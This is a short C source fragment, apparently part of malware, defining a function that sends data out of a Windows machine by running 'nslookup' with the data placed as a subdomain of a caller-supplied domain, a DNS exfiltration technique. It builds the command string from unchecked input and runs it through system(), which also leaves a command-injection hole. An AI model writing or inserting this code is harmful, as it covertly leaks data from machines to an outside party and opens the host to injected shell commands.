#include <winsock2.h>

void SendViaDNS(const char* data, const char* domain) {
    char query[512];
    snprintf(query, sizeof(query), "nslookup %s.%s", data, domain);
    system(query);
}
